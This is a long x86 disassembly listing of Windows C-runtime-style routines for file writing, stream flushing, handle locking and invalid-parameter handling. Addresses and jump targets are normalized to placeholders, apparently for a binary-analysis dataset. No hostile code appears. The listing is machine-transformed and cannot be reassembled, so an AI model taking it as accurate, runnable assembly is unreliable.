mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_406995
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_405ca6
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_4057da
pop ecx
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405939
mov eax [ ebp - 0x1c ]
sub_405943
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
je r-xdata
pop esi
pop ebp
retn
test al 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_404db5
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_405974
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test eax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push esi
call sub_40432c
pop ecx
push eax
call sub_40673b
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_4059dc
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_405974
pop ecx
test eax eax
je r-xdata
push esi
call sub_405a24
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_40432c
push eax
call sub_40b2c7
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_405a24
push 0x14
push r--data
call sub_405254
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x24 ] edi
push 0x1
call sub_40917b
pop ecx
mov [ ebp - 0x4 ] edi
xor esi esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_405af5
cmp [ ebp + 0x8 ] 0x1
mov eax [ ebp - 0x1c ]
je r-xdata
mov eax [ rw-data ]
lea eax [ eax + esi * 4 ]
cmp [ eax ] edi
je r-xdata
call sub_405299
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
mov eax [ eax ]
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_405e07
pop ecx
pop ecx
xor edx edx
inc edx
mov [ ebp - 0x4 ] edx
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov [ ebp - 0x4 ] edi
call sub_405ac6
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edi
jne r-xdata
push eax
call sub_4059dc
pop ecx
cmp eax 0xffffffff
je r-xdata
test cl 0x2
je r-xdata
inc [ ebp - 0x1c ]
jmp r-xdata
push eax
call sub_4059dc
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_405b16
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x328 ] 0x0
push ebx
push 0x4c
lea eax [ ebp - 0x324 ]
push 0x0
push eax
call sub_4046e0
lea eax [ ebp - 0x328 ]
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x2d4 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x20c ] ecx
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov [ ebp - 0x328 ] 0xc0000417
mov [ ebp - 0x324 ] 0x1
mov [ ebp - 0x31c ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov ebx eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push 0xc0000417
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_4045c5
leave
retn
test ebx ebx
jne r-xdata
push 0x2
call sub_40b3a8
pop ecx
sub_405c3e
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_40a4c8
pop ecx
test eax eax
je r-xdata
push 0x2
call sub_40b3a8
pop ecx
pop ebp
jmp sub_405b16
pop ebp
jmp eax
sub_405c64
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_405ccc
mov edi edi
push ebp
mov ebp esp
push esi
call sub_405cb9
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_405c64
pop ecx
mov esi eax
call sub_405ca6
mov [ eax ] esi
pop esi
pop ebp
retn
sub_405cf5
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_40aa2f
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_40aa2f
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_405dc6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_40917b
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_405e07
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_40917b
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_405e39
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_4090a1
pop ecx
pop ebp
retn
sub_405e75
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x14
mov eax [ ebp + 0xc ]
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_4090a1
pop ecx
pop ebp
retn
sub_405ea4
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_40432c
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_405ca6
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_405ca6
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_405cef
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_40673b
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
cmp edi ebx
mov [ esi + 0x4 ] ecx
jle r-xdata
push [ ebp + 0xc ]
call sub_40b636
pop ecx
test eax eax
jne r-xdata
call sub_405cef
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_40673b
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_40b5ed
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_40b4d4
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_406008
mov edi edi
push ebp
mov ebp esp
mov eax 0x1ae4
call sub_40b8e0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push esi
xor esi esi
mov [ ebp - 0x1acc ] eax
mov [ ebp - 0x1ac8 ] esi
mov [ ebp - 0x1ad0 ] esi
cmp [ ebp + 0x10 ] esi
jne r-xdata
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
lea esi [ eax * 4 + rw-data ]
mov eax [ esi ]
and edi 0x1f
shl edi 0x6
add eax edi
mov bl [ eax + 0x24 ]
add bl bl
sar bl 0x1
mov [ ebp - 0x1ad8 ] esi
mov [ ebp - 0x1ad9 ] bl
cmp bl 0x2
je r-xdata
call sub_405cb9
mov [ eax ] esi
call sub_405ca6
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_405c3e
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_4045c5
leave
retn
mov ecx [ ebp + 0x10 ]
not ecx
test cl 0x1
jne r-xdata
cmp bl 0x1
jne r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
call sub_405cb9
xor esi esi
mov [ eax ] esi
call sub_405ca6
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_405c3e
add esp 0x14
jmp r-xdata
push [ ebp + 0x8 ]
call sub_40b636
pop ecx
test eax eax
je r-xdata
push 0x2
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_40b44f
add esp 0x10
or eax 0xffffffff
jmp r-xdata
xor ecx ecx
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x80
je r-xdata
pop edi
pop ebx
push 0x0
lea ecx [ ebp - 0x1ad4 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp - 0x1acc ]
push [ eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac0 ] ecx
test bl bl
jne r-xdata
call sub_40a714
mov eax [ eax + 0x6c ]
xor ecx ecx
cmp [ eax + 0x14 ] ecx
lea eax [ ebp - 0x1ae4 ]
sete cl
push eax
mov eax [ esi ]
push [ edi + eax ]
mov [ ebp - 0x1ae0 ] ecx
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
mov eax [ ebp - 0x1ad4 ]
and [ ebp - 0x1ac0 ] 0x0
mov [ ebp - 0x1ac8 ] eax
jmp r-xdata
mov [ ebp - 0x1abc ] eax
cmp bl 0x2
jne r-xdata
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
xor ecx ecx
cmp [ ebp - 0x1ae0 ] ecx
je r-xdata
mov eax [ ebp - 0x1ac8 ]
sub eax [ ebp - 0x1ad0 ]
cmp [ ebp - 0x1ac0 ] 0x0
je r-xdata
cmp [ ebp - 0x1ac8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
cmp [ ebp + 0x10 ] ecx
jbe r-xdata
mov eax [ esi ]
test [ edi + eax + 0x4 ] 0x40
je r-xdata
jmp r-xdata
call [ GetConsoleCP@IAT ]
mov ebx [ ebp - 0x1acc ]
mov [ ebp - 0x1ae4 ] eax
xor eax eax
mov [ ebp - 0x1ac4 ] eax
cmp [ ebp + 0x10 ] eax
jbe r-xdata
test bl bl
je r-xdata
mov esi [ ebp - 0x1ad8 ]
push 0x5
pop esi
cmp [ ebp - 0x1ac0 ] esi
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
push 0x2
lea eax [ ebp - 0x6b8 ]
pop esi
jmp r-xdata
call sub_405ca6
mov [ eax ] 0x1c
call sub_405cb9
and [ eax ] 0x0
mov eax [ ebp - 0x1acc ]
cmp [ eax ] 0x1a
jne r-xdata
mov ecx [ ebp - 0x1ac4 ]
and [ ebp - 0x1abc ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
mov [ ebp - 0x1abc ] eax
mov eax [ esi ]
add eax edi
test [ eax + 0x4 ] 0x80
je r-xdata
push [ ebp - 0x1ac0 ]
call sub_405ccc
pop ecx
jmp r-xdata
call sub_405ca6
mov [ eax ] 0x9
call sub_405cb9
mov [ eax ] esi
jmp r-xdata
xor esi esi
push esi
push esi
push 0xd55
lea ecx [ ebp - 0x1410 ]
push ecx
lea ecx [ ebp - 0x6b8 ]
sub eax ecx
cdq
sub eax edx
sar eax 0x1
push eax
mov eax ecx
push eax
push esi
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
mov edx [ ebp - 0x1abc ]
movzx edx [ edx ]
add [ ebp - 0x1abc ] esi
add ecx esi
cmp dx 0xa
jne r-xdata
mov ecx [ ebp - 0x1abc ]
and [ ebp - 0x1ac4 ] 0x0
sub ecx [ ebp - 0x1acc ]
lea eax [ ebp - 0x1ab8 ]
xor eax eax
jmp r-xdata
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1ac4 ]
inc [ ebp - 0x1ac4 ]
mov dl [ edx ]
inc ecx
cmp dl 0xa
jne r-xdata
cmp al 0x1
je r-xdata
mov cl [ ebx ]
mov esi [ ebp - 0x1ad8 ]
xor eax eax
cmp cl 0xa
sete al
mov [ ebp - 0x1ae0 ] eax
mov eax [ esi ]
add eax edi
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
mov eax ebx
sub eax esi
push eax
lea eax [ ebp + esi - 0x1410 ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
add [ ebp - 0x1ac4 ] esi
mov [ eax ] dx
add eax esi
cmp [ ebp - 0x1ac4 ] 0x6a8
jb r-xdata
push 0xd
pop ebx
mov [ eax ] bx
add eax esi
add [ ebp - 0x1ac4 ] esi
mov ebx eax
lea eax [ ebp - 0x1ab8 ]
sub ebx eax
push 0x0
lea eax [ ebp - 0x1ad4 ]
push eax
push ebx
lea eax [ ebp - 0x1ab8 ]
push eax
mov eax [ esi ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x1abc ]
add [ ebp - 0x1abc ] 0x2
movzx edx [ edx ]
inc ecx
inc ecx
cmp dx 0xa
jne r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
mov [ eax ] dl
inc eax
inc [ ebp - 0x1abc ]
cmp [ ebp - 0x1abc ] 0x13ff
jb r-xdata
inc [ ebp - 0x1ad0 ]
mov [ eax ] 0xd
inc eax
inc [ ebp - 0x1abc ]
movzx esi [ ebx ]
xor ecx ecx
cmp si 0xa
sete cl
inc ebx
inc ebx
add [ ebp - 0x1abc ] 0x2
mov [ ebp - 0x1ac0 ] esi
mov [ ebp - 0x1ae0 ] ecx
cmp al 0x2
jne r-xdata
movsx eax cl
push eax
call sub_40b8c8
pop ecx
test eax eax
je r-xdata
mov dl [ eax + 0x34 ]
mov [ ebp - 0xc ] dl
mov [ ebp - 0xb ] cl
and [ eax + 0x38 ] 0x0
push 0x2
lea eax [ ebp - 0xc ]
push eax
jmp r-xdata
call [ GetLastError@IAT ]
mov [ ebp - 0x1ac0 ] eax
add esi [ ebp - 0x1ad4 ]
cmp ebx esi
jg r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x1ad4 ]
add [ ebp - 0x1ac8 ] eax
cmp eax ebx
jl r-xdata
add [ ebp - 0x1ac4 ] 0x2
mov [ eax ] dx
inc eax
inc eax
cmp [ ebp - 0x1ac4 ] 0x13fe
jb r-xdata
add [ ebp - 0x1ad0 ] 0x2
push 0xd
pop ebx
mov [ eax ] bx
inc eax
inc eax
add [ ebp - 0x1ac4 ] 0x2
mov eax [ ebp - 0x1ac4 ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
push [ ebp - 0x1ac0 ]
call sub_40b69a
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
cmp al 0x2
jne r-xdata
cmp al 0x1
je r-xdata
push 0x1
push ebx
mov ecx [ ebp - 0x1acc ]
sub ecx ebx
add ecx [ ebp + 0x10 ]
xor eax eax
inc eax
cmp ecx eax
jbe r-xdata
lea eax [ ebp - 0x1ac0 ]
push eax
call sub_40b876
add esp 0xc
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
mov [ ebp - 0x1ac8 ] eax
cmp eax [ ebp + 0x10 ]
jb r-xdata
jmp r-xdata
mov eax [ ebp - 0x1abc ]
sub eax [ ebp - 0x1acc ]
cmp eax [ ebp + 0x10 ]
jb r-xdata
cmp ecx [ ebp + 0x10 ]
jae r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
add [ ebp - 0x1ac8 ] 0x2
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp [ ebp - 0x1abc ] eax
jb r-xdata
xor eax eax
push eax
push eax
push 0x5
lea ecx [ ebp - 0xc ]
push ecx
push 0x1
lea ecx [ ebp - 0x1ac0 ]
push ecx
push eax
push [ ebp - 0x1ae4 ]
inc ebx
inc [ ebp - 0x1abc ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx [ esi ]
mov dl [ ebx ]
inc [ ebp - 0x1ac8 ]
mov [ edi + ecx + 0x34 ] dl
mov ecx [ esi ]
mov [ edi + ecx + 0x38 ] eax
jmp r-xdata
push 0x2
lea eax [ ebp - 0x1ac0 ]
push ebx
push eax
call sub_40b876
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
cmp ebx esi
jg r-xdata
mov esi [ ebp - 0x1ad8 ]
jmp r-xdata
push 0xd
pop eax
push eax
mov [ ebp - 0x1ac0 ] eax
call sub_40b69a
pop ecx
cmp ax [ ebp - 0x1ac0 ]
jne r-xdata
mov al [ ebp - 0x1ad9 ]
test al al
jne r-xdata
jmp r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push esi
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
inc ebx
inc [ ebp - 0x1abc ]
jmp r-xdata
inc [ ebp - 0x1ac8 ]
inc [ ebp - 0x1ad0 ]
mov eax [ ebp - 0x1abc ]
mov ecx [ ebp - 0x1ad0 ]
add eax ecx
cmp [ ebp - 0x1ac4 ] esi
mov [ ebp - 0x1ac8 ] eax
jl r-xdata
cmp [ ebp - 0x1ae0 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x1ac4 ]
push eax
push 0x1
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1ad8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] 0xd
push [ edi + eax ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x1ac4 ] 0x1
jl r-xdata
inc [ ebp - 0x1ad0 ]
inc [ ebp - 0x1ac8 ]
jmp r-xdata
sub_40673b
push 0x10
push r--data
call sub_405254
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor edi edi
cmp eax edi
jl r-xdata
call sub_405cb9
and [ eax ] 0x0
call sub_405ca6
mov [ eax ] 0x9
call sub_405cb9
mov [ eax ] edi
call sub_405ca6
mov [ eax ] 0x9
push edi
push edi
push edi
push edi
push edi
call sub_405c3e
add esp 0x14
jmp r-xdata
cmp eax [ rw-data ]
jb r-xdata
call sub_405299
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea ebx [ ecx * 4 + rw-data ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ ebx ]
movsx ecx [ ecx + esi + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_406995
pop ecx
mov [ ebp - 0x4 ] edi
mov eax [ ebx ]
test [ eax + esi + 0x4 ] 0x1
je r-xdata
call sub_405ca6
mov [ eax ] 0x9
call sub_405cb9
mov [ eax ] edi
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_406008
add esp 0xc
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40680d
mov eax [ ebp - 0x1c ]
sub_406817
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
jl r-xdata
call sub_405ca6
mov [ eax ] 0x9
call sub_405cb9
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rw-data ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_406898
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
jl r-xdata
call sub_405ca6
mov [ eax ] 0x9
call sub_405cb9
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rw-data ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_40691e
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_405cb9
and [ eax ] 0x0
call sub_405ca6
mov [ eax ] 0x9
or eax 0xffffffff
pop ebp
retn
call sub_405cb9
mov [ eax ] esi
call sub_405ca6
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_405c3e
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax [ rw-data ]
jae r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
add eax ecx
test [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ eax ]
sub_406995
push 0xc
push r--data
call sub_405254
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_40917b
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_405299
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_406a2c
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_40b91a
pop ecx
pop ecx
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_406a35
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_406a5c
push 0x18
push r--data
call sub_405254
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_4090b8
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_40917b
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_406bed
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rw-data ]
test esi esi
je r-xdata
call sub_405299
retn
push 0x40
push 0x20
call sub_40aa2f
pop ecx
pop ecx
